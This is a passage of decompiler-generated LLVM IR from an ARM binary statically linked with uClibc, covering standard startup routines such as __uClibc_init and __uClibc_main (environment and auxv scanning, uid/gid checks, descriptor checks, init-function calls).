  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_199e8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_199f0 = icmp eq i32 %v2_199e8, -1
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r3, align 4
  br i1 %v3_199f0, label %dec_label_pc_199fc, label %dec_label_pc_19a14

dec_label_pc_199fc:                               ; preds = %entry
  %v0_19a00 = load i32, i32* @r5, align 4
  %v2_19a08 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35604), i32 %v0_19a00)
  %v1_19a0c = load i32, i32* @r4, align 4
  %v1_19a10 = icmp ne i32 %v2_19a08, %v1_19a0c
  call void @__pseudo_cond_branch(i1 %v1_19a10, i32 ptrtoint (i32* @global_var_179f4.1606 to i32))
  br label %dec_label_pc_19a14

dec_label_pc_19a14:                               ; preds = %entry, %dec_label_pc_199fc
  %v1_19a1c = phi i32 [ %v2_199e8, %entry ], [ %v2_19a08, %dec_label_pc_199fc ]
  store i32 %v3_199d4, i32* @r4, align 4
  store i32 %v6_199d4, i32* @r5, align 4
  ret i32 %v1_19a1c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_19a14, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19a28 = load i32, i32* @r4, align 4
  store i32 %v3_19a28, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r4.global-to-local, align 4
  %v4_19a38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 164) to i32*), align 4
  %v1_19a3c = inttoptr i32 %v4_19a38 to i32*
  %v2_19a3c = load i32, i32* %v1_19a3c, align 4
  %v2_19a40 = icmp eq i32 %v2_19a3c, 0
  br i1 %v2_19a40, label %dec_label_pc_19a48, label %dec_label_pc_19a6c

dec_label_pc_19a48:                               ; preds = %entry
  store i32 4096, i32* %v1_19a3c, align 4
  %v0_19a50 = call i32 @__pthread_initialize_minimal()
  %v0_19a58 = load i32, i32* %r4.global-to-local, align 4
  %v2_19a58 = add i32 %v0_19a58, -121052
  %v2_19a60 = icmp eq i32 %v2_19a58, 0
  br i1 %v2_19a60, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_19a48
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_19a48, %bb
  %v2_19a68 = xor i1 %v2_19a60, true
  call void @__pseudo_cond_branch(i1 %v2_19a68, i32 %v2_19a58)
  %v2_19a6c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19a6c

dec_label_pc_19a6c:                               ; preds = %entry, %bb4
  %v2_19a6c = phi i32 [ %v2_19a6c.pre, %bb4 ], [ %v3_19a28, %entry ]
  %.0 = phi i32 [ %v0_19a50, %bb4 ], [ undef, %entry ]
  store i32 %v2_19a6c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_19a6c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 99716, i32* %r4.global-to-local, align 4
  %v1_19a8c = add i32 %tmp, 4
  store i32 %v1_19a8c, i32* %ip.global-to-local, align 4
  %v2_19a90 = load i32, i32* %arg3, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r4.global-to-local, align 4
  %v3_19a9c = mul i32 %arg2, 4
  store i32 %v3_19a9c, i32* @r7, align 4
  %v4_19aa4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 28) to i32*), align 4
  store i32 %v4_19aa4, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_19aac = add i32 %v1_19a8c, %v3_19a9c
  store i32 %v2_19aac, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %stack_var_-416, align 4
  %v4_19ab4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 64) to i32*), align 4
  store i32 %v4_19ab4, i32* %r4.global-to-local, align 4
  %v3_19ab8 = icmp uge i32 %v2_19aac, %v2_19a90
  store i1 %v3_19ab8, i1* %cpsr_c.global-to-local, align 1
  %v9_19ab8 = icmp eq i32 %v2_19aac, %v2_19a90
  store i1 %v9_19ab8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_19ac0 = inttoptr i32 %v4_19ab4 to i32*
  store i32 %v2_19aac, i32* %v2_19ac0, align 4
  br i1 %v9_19ab8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_19ac8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19ac8 = load i32, i32* %r1.global-to-local, align 4
  %v2_19ac8 = inttoptr i32 %v1_19ac8 to i32*
  store i32 %v0_19ac8, i32* %v2_19ac8, align 4
  %v2_19acc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19acc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 27696, i32* %r2.global-to-local, align 4
  %v0_19ad8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_19ad8, i32* @r6, align 4
  br i1 %v9_19ab8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_19ae053 = add i32 %v2_19acc, 27696
  %v4_19ae054 = inttoptr i32 %v3_19ae053 to i32*
  store i32 %arg6, i32* %v4_19ae054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_19adc = load i32, i32* %ip.global-to-local, align 4
  %v2_19adc = load i32, i32* @r7, align 4
  %v3_19adc = add i32 %v2_19adc, %v1_19adc
  store i32 %v3_19adc, i32* %r3.global-to-local, align 4
  %v3_19ae050 = add i32 %v2_19acc, 27696
  %v4_19ae051 = inttoptr i32 %v3_19ae050 to i32*
  store i32 %arg6, i32* %v4_19ae051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_19aec = load i32, i32* %r3.global-to-local, align 4
  %v2_19aec = load i32, i32* %r4.global-to-local, align 4
  %v3_19aec = inttoptr i32 %v2_19aec to i32*
  store i32 %v1_19aec, i32* %v3_19aec, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_19af0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_19af0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_19af8 = bitcast i32* %stack_var_-120 to i8*
  %v4_19af8 = call i32 @__GI_memset(i8* %v3_19af8, i32 0, i32 120)
  store i32 %v4_19af8, i32* %r0.global-to-local, align 4
  %v0_19afc = load i32, i32* %r4.global-to-local, align 4
  %v1_19afc = inttoptr i32 %v0_19afc to i32*
  %v2_19afc = load i32, i32* %v1_19afc, align 4
  br label %dec_label_pc_19b08

dec_label_pc_19b08:                               ; preds = %dec_label_pc_19b08, %bb77
  %storemerge = phi i32 [ %v2_19afc, %bb77 ], [ %v1_19b14, %dec_label_pc_19b08 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_19b08 = inttoptr i32 %storemerge to i32*
  %v2_19b08 = load i32, i32* %v1_19b08, align 4
  store i32 %v2_19b08, i32* %r3.global-to-local, align 4
  %v2_19b0c = icmp eq i32 %v2_19b08, 0
  %v1_19b14 = add i32 %storemerge, 4
  br i1 %v2_19b0c, label %dec_label_pc_19b14, label %dec_label_pc_19b08

dec_label_pc_19b14:                               ; preds = %dec_label_pc_19b08
  store i32 %v1_19b14, i32* @r4, align 4
  store i32 %v2_19af0, i32* @r5, align 4
  %v1_19b3830 = inttoptr i32 %v1_19b14 to i32*
  %v2_19b3831 = load i32, i32* %v1_19b3830, align 4
  store i32 %v2_19b3831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19b3c33 = icmp eq i32 %v2_19b3831, 0
  store i1 %v2_19b3c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b3c33, label %dec_label_pc_19b44, label %dec_label_pc_19b20

dec_label_pc_19b20:                               ; preds = %dec_label_pc_19b14, %dec_label_pc_19b38
  %v4_19b28 = phi i32 [ %v1_19b34, %dec_label_pc_19b38 ], [ %v1_19b14, %dec_label_pc_19b14 ]
  %v5_19b24 = phi i32 [ %v2_19b38, %dec_label_pc_19b38 ], [ %v2_19b3831, %dec_label_pc_19b14 ]
  %v2_19b20 = icmp ugt i32 %v5_19b24, 13
  store i1 %v2_19b20, i1* %cpsr_c.global-to-local, align 1
  %v7_19b20 = icmp eq i32 %v5_19b24, 14
  store i1 %v7_19b20, i1* %cpsr_z.global-to-local, align 1
  %v2_19b24 = xor i1 %v2_19b20, true
  %v3_19b24 = or i1 %v7_19b20, %v2_19b24
  br i1 %v3_19b24, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_19b20
  %v4_19b24 = load i32, i32* @r5, align 4
  %v6_19b24 = and i32 %v5_19b24, 536870912
  %v7_19b24 = icmp ne i32 %v6_19b24, 0
  store i1 %v7_19b24, i1* %cpsr_c.global-to-local, align 1
  %v8_19b24 = mul i32 %v5_19b24, 8
  %v9_19b24 = add i32 %v4_19b24, %v8_19b24
  store i32 %v9_19b24, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_19b20, %bb78
  %v1_19b30 = phi i1 [ %v2_19b20, %dec_label_pc_19b20 ], [ %v7_19b24, %bb78 ]
  %v2_19b28 = xor i1 %v1_19b30, true
  %v3_19b28 = or i1 %v7_19b20, %v2_19b28
  br i1 %v3_19b28, label %bb80, label %dec_label_pc_19b38

bb80:                                             ; preds = %bb79
  store i32 %v4_19b28, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b38

dec_label_pc_19b38:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_19b28, i32 ptrtoint (i32* @global_var_15be0.1615 to i32))
  %v0_19b34 = load i32, i32* @r4, align 4
  %v1_19b34 = add i32 %v0_19b34, 8
  store i32 %v1_19b34, i32* @r4, align 4
  %v1_19b38 = inttoptr i32 %v1_19b34 to i32*
  %v2_19b38 = load i32, i32* %v1_19b38, align 4
  store i32 %v2_19b38, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19b3c = icmp eq i32 %v2_19b38, 0
  store i1 %v2_19b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b3c, label %dec_label_pc_19b44, label %dec_label_pc_19b20

dec_label_pc_19b44:                               ; preds = %dec_label_pc_19b38, %dec_label_pc_19b14
  store i32 %v2_19af0, i32* %r0.global-to-local, align 4
  %v1_19b48 = call i32 @_dl_aux_init(i32 %v2_19af0)
  store i32 %v1_19b48, i32* %r0.global-to-local, align 4
  %v1_19b4c = call i32 @__GI___uClibc_init(i32 %v1_19b48)
  store i32 %v1_19b4c, i32* @r0, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v2_19b54 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19b54, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_19b5c = add i32 %v2_19b54, 164
  %v3_19b5c = inttoptr i32 %v2_19b5c to i32*
  %v4_19b5c = load i32, i32* %v3_19b5c, align 4
  store i32 %v4_19b5c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19b64 = icmp eq i32 %tmp66, 0
  store i1 %v2_19b64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b64, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_19b44
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_19b44, %bb81
  %v0_19b70 = phi i32 [ %tmp66, %dec_label_pc_19b44 ], [ 4096, %bb81 ]
  %v3_19b6c = icmp eq i32 %tmp65, -1
  store i1 %v3_19b6c, i1* %cpsr_c.global-to-local, align 1
  %v8_19b6c = icmp eq i32 %tmp65, -1
  store i1 %v8_19b6c, i1* %cpsr_z.global-to-local, align 1
  %v2_19b70 = inttoptr i32 %v4_19b5c to i32*
  store i32 %v0_19b70, i32* %v2_19b70, align 4
  br i1 %v3_19b6c, label %dec_label_pc_19b78, label %dec_label_pc_19ba0

dec_label_pc_19b78:                               ; preds = %bb82
  %v0_19b78 = call i32 @getuid()
  store i32 %v0_19b78, i32* @r0, align 4
  store i32 %v0_19b78, i32* %r4.global-to-local, align 4
  %v0_19b80 = call i32 @geteuid()
  store i32 %v0_19b80, i32* @r0, align 4
  %v3_19b84 = icmp uge i32 %v0_19b78, %v0_19b80
  store i1 %v3_19b84, i1* %cpsr_c.global-to-local, align 1
  %v9_19b84 = icmp eq i32 %v0_19b78, %v0_19b80
  store i1 %v9_19b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19b84, label %dec_label_pc_19b8c, label %dec_label_pc_19bc8

dec_label_pc_19b8c:                               ; preds = %dec_label_pc_19b78
  %v1_19b8c = call i32 @getgid(i32 %v0_19b80)
  store i32 %v1_19b8c, i32* @r0, align 4
  store i32 %v1_19b8c, i32* %r4.global-to-local, align 4
  %v0_19b94 = call i32 @getegid()
  store i32 %v0_19b94, i32* %r0.global-to-local, align 4
  %v3_19b98 = icmp uge i32 %v1_19b8c, %v0_19b94
  store i1 %v3_19b98, i1* %cpsr_c.global-to-local, align 1
  %v9_19b98 = icmp eq i32 %v1_19b8c, %v0_19b94
  store i1 %v9_19b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19b98, label %dec_label_pc_19ba0, label %dec_label_pc_19bc8

dec_label_pc_19ba0:                               ; preds = %dec_label_pc_19b8c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_19b6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_19b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19b6c, label %dec_label_pc_19bf0, label %dec_label_pc_19bac

dec_label_pc_19bac:                               ; preds = %dec_label_pc_19ba0
  store i32 %tmp64, i32* @r3, align 4
  %v3_19bb0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_19bb0, i1* %cpsr_c.global-to-local, align 1
  %v9_19bb0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_19bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19bb0, label %dec_label_pc_19bb8, label %dec_label_pc_19bc8

dec_label_pc_19bb8:                               ; preds = %dec_label_pc_19bac
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_19bc0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_19bc0, i1* %cpsr_c.global-to-local, align 1
  %v9_19bc0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_19bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19bc0, label %dec_label_pc_19bf0, label %dec_label_pc_19bc8

dec_label_pc_19bc8:                               ; preds = %dec_label_pc_19bac, %dec_label_pc_19b8c, %dec_label_pc_19b78, %dec_label_pc_19bb8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_19bd4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_19bdc = load i32, i32* @r4, align 4
  store i32 %v0_19bdc, i32* %r1.global-to-local, align 4
  %v2_19be0 = call i32 @__check_one_fd(i32 1, i32 %v0_19bdc)
  %v0_19be4 = load i32, i32* @r4, align 4
  store i32 %v0_19be4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_19bec = call i32 @__check_one_fd(i32 2, i32 %v0_19be4)
  store i32 %v2_19bec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bf0

dec_label_pc_19bf0:                               ; preds = %dec_label_pc_19bb8, %dec_label_pc_19ba0, %dec_label_pc_19bc8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 1128, i32* %r3.global-to-local, align 4
  %v2_19bf8 = load i32, i32* %arg3, align 4
  store i32 %v2_19bf8, i32* %r2.global-to-local, align 4
  %v2_19bfc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19bfc, i32* %r1.global-to-local, align 4
  %v3_19c00 = add i32 %v2_19bfc, 1128
  %v4_19c00 = inttoptr i32 %v3_19c00 to i32*
  store i32 %v2_19bf8, i32* %v4_19c00, align 4
  %v0_19c04 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c04 = inttoptr i32 %v0_19c04 to i32*
  %v2_19c04 = load i32, i32* %v1_19c04, align 4
  store i32 %v2_19c04, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19c08 = icmp eq i32 %v2_19c04, 0
  store i1 %v2_19c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c08, label %bb84, label %dec_label_pc_19c10

dec_label_pc_19c10:                               ; preds = %dec_label_pc_19bf0
  store i32 180, i32* %r3.global-to-local, align 4
  %v0_19c14 = load i32, i32* %r1.global-to-local, align 4
  %v2_19c14 = add i32 %v0_19c14, 180
  %v3_19c14 = inttoptr i32 %v2_19c14 to i32*
  %v4_19c14 = load i32, i32* %v3_19c14, align 4
  store i32 %v4_19c14, i32* %r3.global-to-local, align 4
  %v2_19c18 = inttoptr i32 %v4_19c14 to i32*
  store i32 %v2_19c04, i32* %v2_19c18, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_19c20 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c20 = inttoptr i32 %v0_19c20 to i32*
  %v2_19c20 = load i32, i32* %v1_19c20, align 4
  store i32 %v2_19c20, i32* %r0.global-to-local, align 4
  %v4_19c24 = call i32 @__GI_strrchr(i32 %v2_19c20, i32 47, i32 %v2_19bf8, i32 %v4_19c14)
  store i32 %v4_19c24, i32* %r0.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_19c2c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19c2c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19c30 = icmp eq i32 %v4_19c24, 0
  store i1 %v2_19c30, i1* %cpsr_z.global-to-local, align 1
  %v2_19c34 = add i32 %v2_19c2c, 108
  %v3_19c34 = inttoptr i32 %v2_19c34 to i32*
  %v4_19c34 = load i32, i32* %v3_19c34, align 4
  store i32 %v4_19c34, i32* %r2.global-to-local, align 4
  br i1 %v2_19c30, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_19c10
  %v2_19c3c58 = inttoptr i32 %v4_19c34 to i32*
  store i32 0, i32* %v2_19c3c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_19c10
  %v2_19c38 = add i32 %v4_19c24, 1
  store i32 %v2_19c38, i32* %r3.global-to-local, align 4
  %v2_19c3c = inttoptr i32 %v4_19c34 to i32*
  store i32 %v4_19c24, i32* %v2_19c3c, align 4
  %v1_19c40 = load i32, i32* %r3.global-to-local, align 4
  %v2_19c40 = load i32, i32* %r2.global-to-local, align 4
  %v3_19c40 = inttoptr i32 %v2_19c40 to i32*
  store i32 %v1_19c40, i32* %v3_19c40, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_19bf0
  %v2_19c50 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19c50, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_19c5c = add i32 %v2_19c50, -32
  store i32 %v2_19c5c, i32* %r5.global-to-local, align 4
  store i32 27692, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_19c6c = add i32 %v2_19c50, 27692
  %v4_19c6c = inttoptr i32 %v3_19c6c to i32*
  store i32 %arg5, i32* %v4_19c6c, align 4
  %v0_19c8418 = load i32, i32* %r4.global-to-local, align 4
  %v1_19c8419 = load i32, i32* %r7.global-to-local, align 4
  %v3_19c8421 = icmp uge i32 %v0_19c8418, %v1_19c8419
  store i1 %v3_19c8421, i1* %cpsr_c.global-to-local, align 1
  %v9_19c8427 = icmp eq i32 %v0_19c8418, %v1_19c8419
  store i1 %v9_19c8427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19c8421, label %dec_label_pc_19cb8.lr.ph, label %dec_label_pc_19c74

dec_label_pc_19c74:                               ; preds = %bb84, %dec_label_pc_19c74
  %v1_19c74 = phi i32 [ %v1_19c80, %dec_label_pc_19c74 ], [ %v0_19c8418, %bb84 ]
  %v0_19c74 = load i32, i32* %r5.global-to-local, align 4
  %v2_19c74 = and i32 %v1_19c74, 1073741824
  %v3_19c74 = icmp ne i32 %v2_19c74, 0
  store i1 %v3_19c74, i1* %cpsr_c.global-to-local, align 1
  %v4_19c74 = mul i32 %v1_19c74, 4
  %v5_19c74 = add i32 %v4_19c74, %v0_19c74
  %v6_19c74 = inttoptr i32 %v5_19c74 to i32*
  %v7_19c74 = load i32, i32* %v6_19c74, align 4
  store i32 %v7_19c74, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_19c74)
  %v0_19c80 = load i32, i32* %r4.global-to-local, align 4
  %v1_19c80 = add i32 %v0_19c80, 1
  store i32 %v1_19c80, i32* %r4.global-to-local, align 4
  %v1_19c84 = load i32, i32* %r7.global-to-local, align 4
  %v3_19c84 = icmp uge i32 %v1_19c80, %v1_19c84
  store i1 %v3_19c84, i1* %cpsr_c.global-to-local, align 1
  %v9_19c84 = icmp eq i32 %v1_19c80, %v1_19c84
  store i1 %v9_19c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19c84, label %dec_label_pc_19cb8.lr.ph, label %dec_label_pc_19c74

dec_label_pc_19cb8.lr.ph:                         ; preds = %dec_label_pc_19c74, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19c8c = icmp eq i32 %v0_19ad8, 0
  store i1 %v2_19c8c, i1* %cpsr_z.global-to-local, align 1
  %v2_19c94 = xor i1 %v2_19c8c, true
  call void @__pseudo_cond_branch(i1 %v2_19c94, i32 %v0_19ad8)
  store i32 -32, i32* %r2.global-to-local, align 4
  %v2_19ca0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_19cac = add i32 %v2_19ca0, -32
  store i32 %v2_19cac, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19cb8

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19cb8.dec_label_pc_19cb8_crit_edge, %dec_label_pc_19cb8.lr.ph
  %v1_19cb8 = phi i32 [ %v1_19cc4, %dec_label_pc_19cb8.dec_label_pc_19cb8_crit_edge ], [ 0, %dec_label_pc_19cb8.lr.ph ]
  %v0_19cb8 = phi i32 [ %v0_19cb8.pre, %dec_label_pc_19cb8.dec_label_pc_19cb8_crit_edge ], [ %v2_19cac, %dec_label_pc_19cb8.lr.ph ]
  %v2_19cb8 = and i32 %v1_19cb8, 1073741824
  %v3_19cb8 = icmp ne i32 %v2_19cb8, 0
  store i1 %v3_19cb8, i1* %cpsr_c.global-to-local, align 1
  %v4_19cb8 = mul i32 %v1_19cb8, 4
  %v5_19cb8 = add i32 %v4_19cb8, %v0_19cb8
  %v6_19cb8 = inttoptr i32 %v5_19cb8 to i32*
  %v7_19cb8 = load i32, i32* %v6_19cb8, align 4
  store i32 %v7_19cb8, i32* %ip.global-to-local, align 4
  store i32 105668, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_19cb8)
  %v0_19cc4 = load i32, i32* @r4, align 4
  %v1_19cc4 = add i32 %v0_19cc4, 1
  store i32 %v1_19cc4, i32* @r4, align 4
  %v1_19cc8 = load i32, i32* @r7, align 4
  %v3_19cc8 = icmp uge i32 %v1_19cc4, %v1_19cc8
  store i1 %v3_19cc8, i1* %cpsr_c.global-to-local, align 1
  %v9_19cc8 = icmp eq i32 %v1_19cc4, %v1_19cc8
  store i1 %v9_19cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19cc8, label %dec_label_pc_19cd0, label %dec_label_pc_19cb8.dec_label_pc_19cb8_crit_edge

dec_label_pc_19cb8.dec_label_pc_19cb8_crit_edge:  ; preds = %dec_label_pc_19cb8
  %v0_19cb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19cb8

dec_label_pc_19cd0:                               ; preds = %dec_label_pc_19cb8
  %v2_19cd4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_19cd4.pre, i32* %r0.global-to-local, align 4
  %v2_19cd8 = add i32 %v2_19cd4.pre, -121468
  store i32 %v2_19cd8, i32* %r2.global-to-local, align 4
  store i32 %v2_19cd8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19ce0 = icmp eq i32 %v2_19cd8, 0
  store i1 %v2_19ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ce0, label %dec_label_pc_19cf8, label %dec_label_pc_19ce8

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19cd0
  store i32 105712, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_19cd8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19cf4 = load i32, i32* %r0.global-to-local, align 4
  %v2_19cf4 = inttoptr i32 %v1_19cf4 to i32*
  store i32 0, i32* %v2_19cf4, align 4
  %v2_19cfc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_19cf8

dec_label_pc_19cf8:                               ; preds = %dec_label_pc_19cd0, %dec_label_pc_19ce8
  %v2_19cfc = phi i32 [ %v2_19cd4.pre, %dec_label_pc_19cd0 ], [ %v2_19cfc.pre, %dec_label_pc_19ce8 ]
  store i32 140, i32* %r3.global-to-local, align 4
  store i32 %v2_19cfc, i32* %r1.global-to-local, align 4
  %v2_19d00 = add i32 %v2_19cfc, 140
  %v3_19d00 = inttoptr i32 %v2_19d00 to i32*
  %v4_19d00 = load i32, i32* %v3_19d00, align 4
  store i32 %v4_19d00, i32* %r2.global-to-local, align 4
  store i32 %v4_19d00, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19d08 = icmp eq i32 %v4_19d00, 0
  store i1 %v2_19d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19d08, label %dec_label_pc_19d20, label %dec_label_pc_19d10

dec_label_pc_19d10:                               ; preds = %dec_label_pc_19cf8
  store i32 105752, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19d00)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19d1c = load i32, i32* %r0.global-to-local, align 4
  %v2_19d1c = inttoptr i32 %v1_19d1c to i32*
  store i32 0, i32* %v2_19d1c, align 4
  br label %dec_label_pc_19d20

dec_label_pc_19d20:                               ; preds = %dec_label_pc_19cf8, %dec_label_pc_19d10
  %v2_19d20 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_19d20, i32* @r0, align 4
  %v1_19d24 = call i32 @_setjmp(i32 %v2_19d20)
  store i32 %v1_19d24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19d28 = icmp eq i32 %v1_19d24, 0
  store i1 %v2_19d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19d28, label %dec_label_pc_19d30, label %dec_label_pc_19d7c

dec_label_pc_19d30:                               ; preds = %dec_label_pc_19d20
  %v0_19d30 = call i32 @__aeabi_read_tp()
  store i32 %v0_19d30, i32* %r0.global-to-local, align 4
  %v1_19d34 = add i32 %v0_19d30, -1168
  store i32 %v1_19d34, i32* %r2.global-to-local, align 4
